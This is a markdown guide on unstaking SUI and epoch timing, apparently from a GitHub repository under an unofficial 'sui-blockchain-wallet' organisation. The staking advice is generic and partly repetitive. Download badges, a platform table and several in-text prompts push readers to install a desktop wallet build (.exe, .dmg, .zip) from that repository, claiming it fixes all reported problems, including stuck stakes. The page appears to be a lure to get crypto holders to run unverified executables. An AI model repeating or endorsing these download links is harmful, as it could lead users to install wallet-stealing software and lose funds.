![SUI Wallet](assets/banner-article.png)

# Unstaking SUI and epoch timing

An unstake completes at an epoch boundary, so the clock matters as much as the click.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Unstaking ends the position: the principal returns to the account together with the rewards it earned while staked. It is a transaction rather than a toggle, and it does not free the SUI instantly - the staking screen shows the position's state, and that state is the answer to "is it available yet".

## The unstake steps

Open the staking screen, select the position, choose to unstake, and approve the transaction. It carries a fee like any other transaction, so the account needs spendable SUI to send it, and the step fails quietly if it does not.

Then watch the position rather than the balance. The stake is still a position until it is not, and the screen is the only place that distinction is visible.

The steps are short enough that the care goes into the timing rather than the clicking. Decide before you start whether you are closing the position or reducing it, because the two actions look identical in the first window and produce different outcomes a moment later.

## Why it is not instant

A staked position is committed to the network's accounting, and releasing it is an operation the network performs rather than a switch the wallet flips. That is why the funds do not appear the moment you approve, and why refreshing changes nothing.

The useful habit is to unstake early rather than at the moment you need the money. A reader who unstakes because a payment is due in an hour has left the decision too late, and no amount of refreshing changes that.

## What returns with the principal

The principal comes back with the rewards accrued inside the position. They are not a separate deposit that has been waiting somewhere - they are part of what the position is worth, which is why the number that returns is larger than the number that was staked.

[SUI staking APY explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-staking-apy-explained.md) explains how that value was described while the position was open, and why the rate on screen was never a schedule of payments.

That is also why the position's value and the balance do not match while it is open, and why unstaking everything at once can look like more money than was ever in the account. Nothing was created: the rewards were there, counted inside the position rather than beside it.

## Partial unstaking

A position can be reduced rather than closed, which is the right move when you need some liquidity and would rather keep the rest earning. The remaining stake stays with its validator and continues as before, without a second choice to make.

Whether a partial unstake is available on a given position is something the screen answers; what matters here is that closing the whole position is not the only option, and treating it as the only option is how people end up unstaking more than they meant to.

## Unstaking from a Ledger account

A position held by a Ledger-backed account needs the device to approve the transaction like any other. That means the device has to be connected, unlocked and on the right app before you start - a step worth completing before the unstake rather than during it.

[Staking SUI from a Ledger account](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-from-a-ledger-account.md) covers the device's part, and
[Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) covers the staking side if the position is still open.

## What cannot be undone

An approved unstake cannot be cancelled while it is in progress; the position is on its way back. A reader who changes their mind can stake again once the funds are spendable, which is a new transaction rather than a reversal.

That is worth knowing before approving rather than after, because the two outcomes look identical on screen for the first few seconds and only one of them is reversible.

An approved unstake is done once it is approved; nothing in the app offers to take it back, and a second stake is a new transaction rather than a reversal of the first.

## When the stake looks stuck

Two things look like a stuck unstake and are not: a position that is still settling, which the screen shows, and a balance that has not refreshed. A position showing no change at all, for longer than the screen suggests, is the case for the current release.

A position that shows no change at all, for longer than the screen suggests, is the case for the current release - the reported problems are fixed there. Install it from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) and look again before assuming anything is lost.

A useful habit while a position settles is to write down what the screen said when you approved the unstake: the amount, the validator, the state. If you later need to ask a question, that note is the difference between a description of a problem and a report somebody can answer.

## FAQ

### How long does it take to unstake SUI?

It is not instant, and the exact timing is the network's rather than the wallet's. The staking screen shows the position's state, which is the only answer that stays true.

### Can I sell crypto after staking it?

Once the unstake has returned the SUI to your spendable balance, yes. While it is staked, it cannot be sent or sold.

### How do you unstake in SUI Wallet?

Open the staking screen, select the position, choose unstake, and approve the transaction. Keep enough spendable SUI to pay the fee.

### Why can I not unstake immediately?

Because releasing a position is a network operation rather than a local toggle. The stake is still committed while it settles, and the screen says so.

### What happens if I stop staking?

The position ends, the principal and its accrued rewards return to the account, and the SUI is spendable again. Nothing is forfeited except the rewards you would have earned next.
